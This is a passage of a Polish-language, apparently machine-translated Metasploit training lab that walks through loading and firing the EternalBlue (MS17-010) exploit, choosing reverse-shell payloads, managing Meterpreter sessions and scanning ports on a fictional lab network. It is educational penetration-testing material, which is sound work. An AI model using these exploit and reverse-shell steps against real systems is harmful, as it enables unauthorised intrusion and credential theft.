|`meterpreter >`|AktywnyMeterpretersesja|Meterpreterpolecenia: `sysinfo`, `getuid`, `hashdump`, `shell`, `background`. Współdziałasz z systemem docelowym.|
|`C:\Windows\system32>`|Powłoka systemu operacyjnego na celu|Standardowe polecenia systemu operacyjnego. Każde wpisane polecenie jest wykonywane na komputerze _docelowym_ , a nie na Twoim komputerze.|

Jeśli polecenie nie działa, pierwszym krokiem rozwiązywania problemu powinno być zawsze sprawdzenie, w którym wierszu poleceń się znajdujesz. Zaskakująco częstym błędem jest próba uruchomienia `set RHOSTS`z `msf6 >`wiersza poleceń (bez kontekstu modułu) lub wpisywanie poleceń Linuksa w sesji Meterpretera.

## Wybór modułu z użyciem

Polecenie `use`wczytuje moduł do bieżącego kontekstu. Możesz określić pełną ścieżkę dostępu do modułu lub użyć indeksu numerycznego z wyniku wyszukiwania:

Terminal AttackBox

```shell-session
msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

Możemy zauważyć dwie rzeczy. Po pierwsze, wiersz poleceń zmienił się, odzwierciedlając załadowany moduł. Po drugie, Metasploit automatycznie wybrał domyślny ładunek ( `windows/x64/meterpreter/reverse_tcp`). Można później nadpisać to ustawienie domyślne za pomocą `set PAYLOAD`polecenia, ale w przypadku wielu typowych exploitów domyślne ustawienie jest rozsądnym punktem wyjścia.

Ważny szczegół: załadowanie modułu nie zmienia katalogu roboczego. Nie znajdujesz się „w” folderze. Nadal jesteś w tej samej `msfconsole`sesji; kontekst po prostu informuje Metasploit, które opcje i polecenia modułu mają zostać zastosowane. Możesz to sprawdzić, uruchamiając dowolne polecenie systemu Linux (np. `whoami`) z poziomu kontekstu modułu i sprawdzając, czy nadal działa.

Aby opuścić kontekst modułu i powrócić do pustego `msf6 >`ekranu monitu, należy użyć `back`polecenia:

Terminal AttackBox

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > back
msf6 >
```

## Opcje pokazu czytania

Po załadowaniu modułu `show options`wyświetla wszystkie konfigurowalne parametry. Spójrzmy na wynik dla naszego przykładu EternalBlue:

Terminal AttackBox

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

 Name           Current Setting  Required  Description
 ----           ---------------  --------  -----------
 RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
 RPORT          445              yes       The target port (TCP)
 SMBDomain                       no        (Optional) The Windows domain to use for authentication
 SMBPass                         no        (Optional) The password for the specified username
 SMBUser                         no        (Optional) The username to authenticate as
 VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
 VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.

Payload options (windows/x64/meterpreter/reverse_tcp):

 Name      Current Setting  Required  Description
 ----      ---------------  --------  -----------
 EXITFUNC  thread           yes       Exit technique (Accepted: ", seh, thread, process, none)
 LHOST     CONNECTION_IP    yes       The listen address (an interface may be specified)
 LPORT     4444             yes       The listen port

Exploit target:

 Id  Name
 --  ----
 0   Automatic Target

msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

Ten wynik składa się z trzech sekcji. Przyjrzyjmy się każdej z nich:

**Opcje modułu** to parametry specyficzne dla samego exploita. Kontrolują one _miejsce_ i _sposób, w jaki_ exploit łączy się z celem. Pole `RHOSTS`(adres IP celu) jest puste i oznaczone `Required: yes`, co oznacza, że ​​exploit nie uruchomi się, dopóki nie podasz wartości. `RPORT`Pole jest wstępnie wypełnione wartością `445`(domyślny port SMB); należy je zmienić tylko wtedy, gdy usługa SMB celu działa na niestandardowym porcie.

**Opcje ładunku** to parametry wybranego ładunku. `LHOST`(adres IP atakującego komputera) i `LPORT`(port, na którym komputer będzie nasłuchiwał połączenia zwrotnego) to dwa, które będziesz ustawiać najczęściej. Metasploit często automatycznie wykrywa połączenie `LHOST`z aktywnymi interfejsami sieciowymi, ale zawsze należy sprawdzić, czy są poprawne, zwłaszcza podczas pracy przez tunel VPN.

**Cel exploita** określa wersję lub konfigurację oprogramowania docelowego, dla którego exploit jest dostosowany. Wiele nowoczesnych modułów korzysta z `Automatic Target`, który automatycznie wykrywa odpowiednią konfigurację. Starsze moduły mogą wymagać ręcznego wyboru celu (np. konkretnego dodatku Service Pack systemu Windows) za pomocą `set TARGET <id>`.

Kolumna **„Wymagane”** to Twoja lista kontrolna. Każdy zaznaczony parametr `yes`musi mieć wartość przed uruchomieniem modułu. Zaznaczone parametry `no`są opcjonalne i można je pozostawić puste.

## Parametry rdzeniowe

Chociaż każdy moduł ma swój własny zestaw opcji, sześć parametrów pojawia się tak często, że powinieneś znać ich nazwę:

- **RHOSTS** : „Zdalny host(y)”. Adres IP celu. Akceptuje pojedynczy adres IP ( `MACHINE_IP`), zakres CIDR ( `MACHINE_IP/24`), zakres z łącznikiem ( `10.48.12.1-10.48.12.50`) lub plik zawierający jeden cel w wierszu ( `file:/path/to/targets.txt`).
- **RPORT** : „Port zdalny”. Port na komputerze docelowym, na którym działa podatna usługa. Zazwyczaj jest to domyślny port usługi.
- **LHOST** : „Host lokalny”. Adres IP atakującej maszyny. To jest miejsce, z którym cel będzie się łączył w celu przesłania ładunków zwrotnych.
- **LPORT** : „Port lokalny”. Port na Twoim komputerze, który będzie odbierał połączenie zwrotne. Domyślnie jest to `4444`. Możesz zmienić ten port na dowolny nieużywany.
- **ŁADUNEK** : Ładunek do dostarczenia wraz z exploitem. Domyślny jest zazwyczaj wstępnie wybrany, ale można go zmienić.
- **SESSION** : Używany z modułami poeksploatacyjnymi. Określa, w której istniejącej sesji ma zostać uruchomiony moduł. Sesje omówimy w następnym zadaniu.

## Ustawianie parametrów

Polecenie `set`przypisuje wartość parametrowi w kontekście bieżącego modułu:

Terminal AttackBox

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS MACHINE_IP
RHOSTS => MACHINE_IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 5555
LPORT => 5555
```

Po ustawieniu wartości uruchom `show options`ponownie, aby sprawdzić, czy wszystko wygląda poprawnie. To dobry nawyk; literówka `RHOSTS`lub niepoprawna wartość `LHOST`to jeden z najczęstszych powodów, dla których exploit nie działa.

Aby wyczyścić pojedynczy parametr, użyj `unset`:

Terminal AttackBox

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > unset RHOSTS
Unsetting RHOSTS...
```

Aby przywrócić _wszystkie_ parametry do wartości domyślnych, użyj `unset all`:

Terminal AttackBox

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > unset all
Flushing datastore...
```

### Lokalny kontra globalny: zestaw kontra zestaw

Parametry ustawione za pomocą `set`są **lokalne** dla bieżącego modułu. Jeśli przełączysz się na inny moduł (używając `use`lub `back`po którym następuje inny `use`), te wartości znikną. Będziesz musiał je ustawić ponownie.

Polecenie `setg`ustawia wartość **globalną** , która jest zachowywana we wszystkich modułach przez cały czas trwania sesji `msfconsole`. Jest to przydatne, gdy pracujesz na tym samym celu z wieloma modułami.

Rozważ następujący scenariusz. Chcesz najpierw przeskanować host Stratford Systems w poszukiwaniu luki w zabezpieczeniach MS17-010 za pomocą modułu pomocniczego, a następnie ją wykorzystać. Bez tego `setg`musiałbyś ustawić `RHOSTS`dwa razy:

Terminal AttackBox

```shell-session
msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > setg RHOSTS MACHINE_IP
RHOSTS => MACHINE_IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > back
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > show options

Module options (auxiliary/scanner/smb/smb_ms17_010):

 Name         Current Setting  Required  Description
 ----         ---------------  --------  -----------
 CHECK_ARCH   true             no        Check for architecture on vulnerable hosts
 CHECK_DOPU   true             no        Check for DOUBLEPULSAR on vulnerable hosts
 CHECK_PIPE   false            no        Check for named pipe on vulnerable hosts
 NAMED_PIPES  [...]            yes       List of named pipes to check
 RHOSTS       MACHINE_IP      yes       The target host(s), [...]
 RPORT        445              yes       The SMB service port (TCP)
 [...]

msf6 auxiliary(scanner/smb/smb_ms17_010) >
```

Możemy zauważyć, że `RHOSTS`jest już zapełniony w module skanera, mimo że ustawiliśmy go w kontekście exploita. To `setg`działa. Wartość jest przenoszona do każdego modułu, dopóki nie wyjdziesz z niego `msfconsole`lub nie wyczyścisz go poleceniem `unsetg`:

Terminal AttackBox

```shell-session
msf6 > unsetg RHOSTS
Unsetting RHOSTS...
```

Praktyczna zasada: używaj `setg`wartości, które pozostają stałe w całym okresie zaangażowania ( `RHOSTS`, `LHOST`) i `set`wartości specyficznych dla danego modułu ( `RPORT`, `PAYLOAD`, `SESSION`).

## Wybór innego ładunku

Metasploit automatycznie przypisuje domyślny ładunek podczas ładowania exploita. Aby wyświetlić wszystkie kompatybilne ładunki dla bieżącego modułu, użyj `show payloads`:

Terminal AttackBox

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads

Compatible Payloads
===================

 #   Name                                                Rank    Check  Description
 -   ----                                                ----    -----  -----------
 0   generic/custom                                      manual  No     Custom Payload
 1   generic/shell_bind_tcp                              manual  No     Generic Command Shell, Bind TCP Inline
 2   generic/shell_reverse_tcp                           manual  No     Generic Command Shell, Reverse TCP Inline
 3   windows/x64/exec                                    manual  No     Windows x64 Execute Command
 4   windows/x64/meterpreter/bind_tcp                    manual  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager
 5   windows/x64/meterpreter/reverse_tcp                 manual  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager
 6   windows/x64/meterpreter_reverse_tcp                 manual  No     Windows Meterpreter Shell, Reverse TCP Inline
 7   windows/x64/shell/reverse_tcp                       manual  No     Windows x64 Command Shell, Reverse TCP Stager
 [...]

msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

Wyświetlane są tylko ładunki zgodne z docelową architekturą i platformą exploita. Aby zmienić ładunki, użyj komendy „ `set PAYLOAD`a następnie podaj nazwę ładunku lub numer indeksu”:

Terminal AttackBox

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/shell/reverse_tcp
PAYLOAD => windows/x64/shell/reverse_tcp
```

Zastępuje to domyślny ładunek Meterpretera podstawową powłoką poleceń. Omówimy, kiedy i dlaczego warto wybrać inne ładunki w sali poświęconej generowaniu ładunku.

## Uruchamianie modułu

Po ustawieniu wszystkich wymaganych parametrów należy uruchomić moduł za pomocą polecenia `exploit`(lub jego aliasu `run`):

Terminal AttackBox

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on CONNECTION_IP:4444
[*] MACHINE_IP:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] MACHINE_IP:445 - Host is likely VULNERABLE to MS17-010!
[*] MACHINE_IP:445 - Connecting to target for exploitation.
[+] MACHINE_IP:445 - Connection established for exploitation.
[+] MACHINE_IP:445 - Target OS selected valid for OS indicated by SMB reply
[*] MACHINE_IP:445 - Trying exploit with 12 Groom Allocations.
[*] MACHINE_IP:445 - Sending all but last fragment of exploit packet
[*] Sending stage (201283 bytes) to MACHINE_IP
[*] Meterpreter session 1 opened (CONNECTION_IP:4444 -> MACHINE_IP:49186) at 2026-03-18 14:32:15 +0000

meterpreter >
```

Prześledźmy, co się wydarzyło w tym wyniku:

1. Metasploit uruchomił na naszym komputerze program nasłuchujący ( `CONNECTION_IP:4444`), aby przechwycić połączenie odwrotne.
2. Przed wysłaniem exploita przeprowadzono szybką kontrolę podatności celu.
3. Exploit nawiązał połączenie z usługą SMB celu ataku, wywołał przepełnienie bufora i wysłał ładunek.
4. Ładunek (Meterpreter) został wykonany na miejscu docelowym i nawiązany ponownie połączenie z naszym programem nasłuchującym.
5. Otworzyła się sesja **Meterpretera** i nasz monit zmienił się na `meterpreter >`.

Teraz mamy interaktywną sesję na temat systemu docelowego.

**Alias`run`** : `run`Polecenie działa dokładnie tak samo jak `exploit`. Istnieje, ponieważ pisanie wydaje się dziwne **,**`exploit` gdy uruchamia się moduł niebędący exploitem (taki jak skaner lub narzędzie do ataków siłowych). W praktyce większość pentesterów używa go `run`zarówno do modułów pomocniczych, jak i `exploit`do modułów exploitów, ale oba działają w dowolnym kontekście.

**Flaga`-z`** : Dodanie `-z`do polecenia uruchamia exploit i natychmiast przełącza sesję **w**`exploit` tło po jej otwarciu, powodując powrót do kontekstu modułu zamiast przenoszenia do sesji Meterpretera:

Terminal AttackBox

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit -z
[...]
[*] Meterpreter session 1 opened (CONNECTION_IP:4444 -> MACHINE_IP:49186)
[*] Session 1 created in the background.
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

Jest to przydatne, gdy chcesz wykorzystać atak na cel, ale `msfconsole`jednocześnie kontynuować pracę, na przykład w celu uruchomienia dodatkowych modułów przeciwko innym hostom.

## Sprawdzanie przed eksploatacją

Niektóre moduły obsługują `check`polecenie, które bada cel, aby ustalić, czy jest podatny na ataki, _bez_ wysyłania ładunku exploita:

Terminal AttackBox

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > check

[*] MACHINE_IP:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] MACHINE_IP:445 - Host is likely VULNERABLE to MS17-010!
[*] MACHINE_IP:445 - Scanned 1 of 1 hosts (100% complete)
```

Nie wszystkie moduły obsługują tę funkcję `check`(przypomnij sobie kolumnę **„Sprawdź”** w wynikach wyszukiwania). Jeśli jest dostępna, uruchomienie jej `check`przed nią `exploit`jest dobrą praktyką, szczególnie w środowiskach produkcyjnych, gdzie nieudany atak mógłby spowodować awarię usługi lub wyzwolenie alertów.

Exploit zadziałał. Widzisz `Meterpreter session 1 opened`przewijanie w terminalu. Podczas prostego ćwiczenia laboratoryjnego z jednym celem, możesz od razu przejść do tej sesji i zacząć eksplorować. Ale prawdziwe działania rzadko są tak proste. Rozważmy scenariusz Stratford Systems: zakres obejmuje kilkanaście hostów w dwóch podsieciach. W trakcie ataku możesz otwierać sesje na wielu maszynach, niektóre poprzez bezpośrednią eksploatację, inne poprzez przechodzenie z już zainfekowanych hostów. Jeśli nie możesz śledzić, która sesja łączy się z którym celem, lub jeśli utracisz sesję, ponieważ nie została ona uruchomiona w tle przed uruchomieniem kolejnego exploita, tracisz czas i potencjalnie alarmujesz obrońców.

Zarządzanie sesjami to niewielki zestaw poleceń, ale kluczowa umiejętność operacyjna. Przeanalizujmy przebieg pracy.

## Czym jest sesja?

Sesja w Metasploit to aktywny kanał komunikacyjny między atakującą maszyną a zainfekowanym celem. Gdy atak się powiedzie i ładunek zostanie wykonany, ładunek ponownie łączy się z Twoją maszyną (lub akceptuje połączenie z niej). Połączenie to jest rejestrowane jako sesja z unikalnym identyfikatorem numerycznym **.**

Sesje mogą być różnych typów, w zależności od ładunku, który je utworzył:

- **MeterpreterSesje** zapewniają bogate, interaktywne środowisko z wbudowanymi poleceniami dostępu do systemu plików, eskalacji uprawnień, przełączania między uprawnieniami i nie tylko. Są to najpopularniejsze i najbardziej funkcjonalne typy sesji.
- **Sesje powłoki** zapewniają podstawową linię poleceń systemu operacyjnego (np. `cmd.exe`w systemie Windows `/bin/sh`czy Linux). Są one prostsze, ale mniej rozbudowane pod względem funkcji.
- **Sesje specyficzne dla protokołu** (nowsze w Metasploit 6.4) zapewniają interaktywny dostęp do usług takich jak SMB, MSSQL, MySQL i PostgreSQL. Są one wyspecjalizowane i służą do ukierunkowanej enumeracji, a nie do ogólnego dostępu.

Bez względu na typ, polecenia służące do zarządzania sesjami są takie same.

## Ustawianie sesji w tle

Gdy jesteś w aktywnej sesji (widzisz `meterpreter >`wiersz poleceń powłoki z komputera docelowego), możesz powrócić do `msfconsole`wiersza poleceń bez zamykania sesji. Nazywa się to **pracą w tle** .

Użyj `background`polecenia (lub jego skrótu `CTRL+Z`):

Terminal AttackBox

```shell-session
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

Sesja jest nadal aktywna; po prostu przeniosłeś fokus z powrotem na `msfconsole`. Połączenie docelowe pozostaje otwarte w tle i możesz do niego wrócić w dowolnym momencie.

Jest to niezbędne podczas interakcji z wieloma celami. Bez działania w tle konieczne byłoby zamknięcie bieżącej sesji (utrata dostępu), aby załadować i uruchomić inny moduł. Dzięki działaniu w tle można utrzymywać wiele jednoczesnych połączeń, kontynuując pracę w środowisku `msfconsole`.

## Wyświetlanie aktywnych sesji

Polecenie `sessions`(bez argumentów) wyświetla wszystkie aktywne sesje. Można je uruchomić z poziomu `msf6 >`wiersza poleceń lub w kontekście dowolnego modułu:

Terminal AttackBox

```shell-session
msf6 > sessions

Active sessions
===============

 Id  Name  Type                  Information            Connection  --  ----  ----                  -----------            ----------  1         meterpreter x64/wind  NT AUTHORITY\SYSTEM @  10.81.117.184:4444 ->            ows                    STRATFORD-WS01         10.81.162.215:49159                                                         (10.81.162.215)  2         meterpreter x64/wind  NT AUTHORITY\SYSTEM @  10.81.117.184:4445 ->            ows                    STRATFORD-WS01         10.81.162.215:49161                                                         (10.81.162.215)
```

Rozbijmy kolumny:

- **Identyfikator** : Unikalny numeryczny identyfikator sesji. Ten numer będzie używany do interakcji z daną sesją, jej zamykania lub kierowania ruchem w jej obrębie.
- **Nazwa** : Opcjonalna etykieta, którą można przypisać za pomocą `sessions -n <name> -i <id>`. Przydatna do śledzenia, która sesja jest która podczas złożonych interakcji.
- **Typ** : Typ sesji i architektura (np. `meterpreter x64/windows`, `shell x64/linux`).
- **Informacje** : W przypadku sesji Meterpretera ta kolumna pokazuje kontekst użytkownika i nazwę hosta. Dzięki temu można szybko sprawdzić, czy zalogowano się jako `NT AUTHORITY\SYSTEM`(z pełnymi uprawnieniami), czy jako zwykły użytkownik. Sesje powłoki mogą pozostawić tę kolumnę pustą.
- **Połączenie** : Para adresów IP:port lokalny i zdalny, pokazująca dokładnie, przez który komputer i port jest podłączona każda sesja.

W tym przykładzie uruchomiliśmy exploit dwukrotnie na maszynie docelowej. Każda sesja łączy się z innym portem na naszej maszynie atakującej ( `4444`, `4445`), dlatego ustawienie unikalnych `LPORT`wartości dla każdego exploita ma znaczenie w przypadku przeprowadzania wielu ataków jednocześnie.

## Interakcja z sesją

Aby powrócić do konkretnej sesji, użyj , `sessions -i`a następnie podaj identyfikator sesji:

Terminal AttackBox

```shell-session
msf6 > sessions -i 1
[*] Starting interaction with 1...

meterpreter >
```

Jesteś teraz z powrotem w sesji 1 i wchodzisz w bezpośrednią interakcję z `STRATFORD-WS01`maszyną. Każde wpisane polecenie jest wykonywane w kontekście tej sesji.

Aby przełączyć się na inną sesję, najpierw włącz w tle bieżącą sesję ( `background`lub `CTRL+Z`), a następnie wejdź w interakcję z inną:

Terminal AttackBox

```shell-session
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions -i 2
[*] Starting interaction with 2...
```

## Sesje zamykające

Aby zakończyć konkretną sesję, użyj polecenia `sessions -k`i podaj identyfikator sesji:

Terminal AttackBox

```shell-session
msf6 > sessions -k 2
[*] Killing session 2
[*] MACHINE_IP - Meterpreter session 2 closed. Reason: User exit
```

Aby zamknąć _wszystkie_ aktywne sesje naraz (stosuj ostrożnie):

Terminal AttackBox

```shell-session
msf6 > sessions -K
[*] Killing all sessions...
[*] MACHINE_IP - Meterpreter session 1 closed. Reason: User exit
```

Zwróć uwagę na różnicę: małe litery `-k <id>`kasują pojedynczą sesję; wielkie litery `-K`kasują wszystkie sesje. W prawdziwym starciu jednoczesna utrata wszystkich sesji to przeszkoda, więc używaj tej opcji `-K`rozważnie i tylko wtedy, gdy zamierzasz oczyścić serwer.

## Sesje i moduły poeksploatacyjne

Sesje to nie tylko interaktywne terminale; stanowią one również pomost do modułów Metasploit po eksploatacji. Wiele `post/`modułów wymaga `SESSION`parametru wskazującego na istniejącą sesję. Na przykład moduł, który zrzuca skróty haseł na system Windows, wymaga sesji Meterpretera na tym systemie, aby móc działać.

Przepływ pracy wygląda następująco:

1. Wykorzystaj cel i otwórz sesję Meterpretera
2. Tło sesji
3. Załaduj moduł poeksploatacyjny za pomocą`use`
4. Ustaw `SESSION`parametr na odpowiedni identyfikator sesji
5. Uruchom moduł

Przećwiczymy ten obieg pracy dogłębnie w sali [posteksploatacyjnej](https://tryhackme.com/room/metasploitpostexploitation)  . Na razie najważniejsze jest to, że sesje nie służą wyłącznie do interaktywnego dostępu; są to wielokrotnego użytku połączenia, z których mogą korzystać inne moduły.

W tym pomieszczeniu zajęliśmy się fundamentamiMetasploitFramework. Podsumujmy podstawowy przepływ pracy, którego się nauczyłeś:

1. **Zrozum podstawowe elementy** :MetasploitOrganizuje swoje możliwości w siedmiu kategoriach modułów (exploity, pomocnicze, ładunki, postprodukcja, kodery, NOP-y, unikanie). Każda akcja wykorzystuje kombinację tych modułów, a łańcuch exploit → ładunek jest podstawowym mechanizmem uzyskiwania dostępu do celu.
    
2. **Znajdź odpowiedni moduł** : `search`Polecenie w połączeniu z filtrami takimi jak `type:`, `platform:`, i `cve:`, pozwala zlokalizować odpowiednie moduły w bibliotece ponad 6100 opcji. Polecenie `info`podaje szczegóły techniczne potrzebne do podjęcia decyzji, czy dany moduł pasuje do Twojego celu.
    
3. **Konfiguracja i uruchomienie** : Polecenia `use`, `set`, `setg`i `show options`umożliwiają załadowanie modułu, przypisanie jego parametrów i weryfikację konfiguracji. Polecenie `exploit`(lub `run`) wysyła go w dół, a `check`polecenie pozwala zweryfikować lukę w zabezpieczeniach bez uruchamiania pełnej wersji exploita.
    
4. **Zarządzaj swoimi sesjami** : Polecenia `background`, `sessions`, i `sessions -i`umożliwiają utrzymywanie i przełączanie się między wieloma aktywnymi połączeniami w ramach interakcji. Sesje to nie tylko interaktywne terminale; to wielokrotnego użytku połączenia, za pośrednictwem których działają moduły poeksploatacyjne.

Czas przejść do następnego pokoju:[Metasploit:Skanowanie i eksploatacja](https://tryhackme.com/room/metasploitscanningandexploitation) .

W poprzednim pokoju nauczyłeś się, jak poruszać się po Metasploit Framework: wyszukiwanie modułów, konfigurowanie parametrów, uruchamianie exploitów i zarządzanie sesjami. To są mechanizmy. W tym pokoju je wdrażasz.

Stratford Systems dał Twojemu zespołowi zielone światło na rozpoczęcie aktywnych testów w sieci wewnętrznej. Twój zakres obejmuje małą podsieć zawierającą stację roboczą z systemem Windows i…Linuxserwer, na którym działają usługi produkcyjne. Twoje cele są proste: zidentyfikuj, co działa na każdym hoście, określ, które usługi są podatne na ataki, wykorzystaj te luki, aby uzyskać dostęp i udokumentuj swoje ustalenia.

## Cele edukacyjne

- **Przeskanuj systemy docelowe** za pomocą Metasploit Wbudowane moduły skanowania portów i wyliczania usług
- **Przechowuj i zarządzaj wynikami** za pomocą Metasploitbaza danych, obejmująca obszary robocze, śledzenie hosta i przechowywanie poświadczeń
- **Identyfikuj luki w zabezpieczeniach** , uruchamiając moduły skanera ukierunkowane na wykryte usługi
- **Wykorzystanie podatnych usług** w dwóch różnych systemach docelowych przy użyciu dwóch różnych typów ataków, co pokazuje, żeMetasploitprzepływ pracy jest uogólniony na wszystkie protokoły, systemy operacyjne i klasy luk w zabezpieczeniach

## Wymagania wstępne

Ten pokój jest bezpośrednio zbudowany na[MetasploitPodstawy](https://tryhackme.com/room/metasploitthebasics) . Powinieneś czuć się komfortowo z:

- Uruchamianie `msfconsole`i używanie `search`, `use`, `info`i`back`
- Ustawianie parametrów modułu za pomocą `set`, `setg`i`show options`
- Uruchamianie modułów za pomocą `exploit`/ `run`i zarządzanie sesjami za pomocą `background`, `sessions`i`sessions -i`

## Dostęp do maszyny

Każdą maszynę można uruchomić z odpowiedniego zadania. Laboratorium składa się głównie z dwóch środowisk docelowych:

|Gospodarz|System operacyjny|
|---|---|
|STRATFORD-WS01|Windows Server 2008 R2|
|stratford-srv01|Ubuntu Linux|

Uruchom AttackBoxa i maszynę laboratoryjną, klikając przyciski `Start AttackBox`i `Start Lab Machine`. Po uruchomieniu AttackBoxa otwórz terminal i wpisz polecenie, `msfconsole`aby rozpocząć eksplorację technik skanowania i eksploatacji luk w zabezpieczeniach.

Masz dwie maszyny laboratoryjne w sieci Stratford Systems i nie masz żadnych informacji poza ich adresami IP. Zanim cokolwiek wykorzystasz, musisz wiedzieć, co działa na każdym hoście: które porty są otwarte, jakie usługi nasłuchują i jakie wersje tych usług są uruchomione. To tutaj rozpoczyna się skanowanie.

Możesz się zastanawiać: dlaczego skanować za pomocą Metasploit kiedy już wiesz, jak używać Nmap Krótka odpowiedź brzmi: **integracja z bazą danych** . Podczas skanowania z poziomu programu `msfconsole`wyniki mogą być przesyłane bezpośrednio do bazy danych Metasploit (którą skonfigurujemy w następnym zadaniu), dzięki czemu będą natychmiast dostępne dla innych modułów. Można również uruchomić Nmap bezpośrednio z poziomu wiersza `msfconsole`poleceń, co daje korzyści z obu rozwiązań.

## Skanowanie portów za pomocą Metasploit Moduły

Metasploit Zawiera kilka modułów skanowania portów w sekcji `auxiliary/scanner/portscan/`. Możesz je wyświetlić za pomocą `search portscan`:

Pole ataku

```shell-session
msf6 > search portscan

Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  auxiliary/scanner/portscan/ftpbounce              .                normal  No     FTP Bounce Port Scanner
   1  auxiliary/scanner/natpmp/natpmp_portscan          .                normal  No     NAT-PMP External Port Scanner
   2  auxiliary/scanner/sap/sap_router_portscanner      .                normal  No     SAPRouter Port Scanner
   3  auxiliary/scanner/portscan/xmas                   .                normal  No     TCP "XMas" Port Scanner
   4  auxiliary/scanner/portscan/ack                    .                normal  No     TCP ACK Firewall Scanner
   5  auxiliary/scanner/portscan/tcp                    .                normal  No     TCP Port Scanner
   6  auxiliary/scanner/portscan/syn                    .                normal  No     TCP SYN Port Scanner
   7  auxiliary/scanner/http/wordpress_pingback_access  .                normal  No     Wordpress Pingback Locator
msf6 >
```

Najczęściej używany jest `auxiliary/scanner/portscan/tcp`, który wykonuje pełneTCPPołącz skanowanie. Uruchommy je i przyjrzyjmy się jego opcjom:

Pole ataku

```shell-session
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > show options

Module options (auxiliary/scanner/portscan/tcp):

 Name         Current Setting  Required  Description
 ----         ---------------  --------  -----------
 CONCURRENCY  10               yes       The number of concurrent ports to check per host
 DELAY        0                yes       The delay between connections, per thread, in milliseconds
 JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
 PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
 RHOSTS                        yes       The target host(s), [...]
 THREADS      1                yes       The number of concurrent threads (max one per host)
 TIMEOUT      1000             yes       The socket connect timeout in milliseconds

msf6 auxiliary(scanner/portscan/tcp) >
```

Oto kilka rzeczy, na które należy zwrócić uwagę przy wyborze tych opcji:

- **PORTY** : Domyślny zakres to . _Nie_`1-10000` jest to to samo, co domyślne ustawienie Nmapa, które skanuje 1000 najczęściej używanych portów. Metasploit skanuje sekwencyjnie każdy port w określonym zakresie. Aby szybko przeskanować, możesz zawęzić zakres lub określić konkretne porty, które Cię interesują.`1-1024`
- **WĄTKI** : Zwiększenie tej wartości przyspiesza skanowanie poprzez równoległe wykonywanie wielu prób połączenia. Wartość `10`jest rozsądna w większości środowisk laboratoryjnych.
- **WSPÓŁBIEŻNOŚĆ** : Kontroluje liczbę portów sprawdzanych jednocześnie przez hosta. Działa w połączeniu z WĄTKAMI, aby określić ogólną prędkość skanowania.

Przeskanujmy stację roboczą Stratford Windows:

Pole ataku

```shell-session
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS MACHINE_IP
RHOSTS => MACHINE_IP
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 1-1024,3389,8000-8100
PORTS => 1-1024,3389,8000-8100
msf6 auxiliary(scanner/portscan/tcp) > set THREADS 10
THREADS => 10
msf6 auxiliary(scanner/portscan/tcp) > run

[+] MACHINE_IP          - MACHINE_IP:135 - TCP OPEN
[+] MACHINE_IP          - MACHINE_IP:139 - TCP OPEN
[+] MACHINE_IP          - MACHINE_IP:445 - TCP OPEN
[+] MACHINE_IP          - MACHINE_IP:3389 - TCP OPEN
[+] MACHINE_IP          - MACHINE_IP:8000 - TCP OPEN
[*] MACHINE_IP          - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/portscan/tcp) >
```

Mamy pięć otwartych portów. Ale same otwarte porty nie mówią nam, jakie usługi są uruchomione ani w jakich wersjach. W tym celu potrzebujemy skanerów specyficznych dla danej usługi.

## Uruchamianie Nmap z Msfconsole

Możesz również uruchomić Nmapa bezpośrednio z wiersza `msf6 >`poleceń. Metasploit przekazuje polecenie do powłoki bazowej:

Pole ataku

```shell-session
msf6 > nmap -sV -O MACHINE_IP
[*] exec: nmap -sV -O MACHINE_IP

Starting Nmap 7.80 ( https://nmap.org ) at 2026-05-14 06:59 BST
Nmap scan report for MACHINE_IP
Host is up (0.0015s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE       VERSION135/tcp  open  msrpc         Microsoft Windows RPC139/tcp  open  tcpwrapped445/tcp  open  microsoft-ds?3389/tcp open  ms-wbt-server Microsoft Terminal Services8000/tcp open  http-alt      webfs/1.21
Service Info: Host: STRATFORD-WS01; OS: Windows; CPE: cpe:/o:microsoft:windows

msf6 >
```

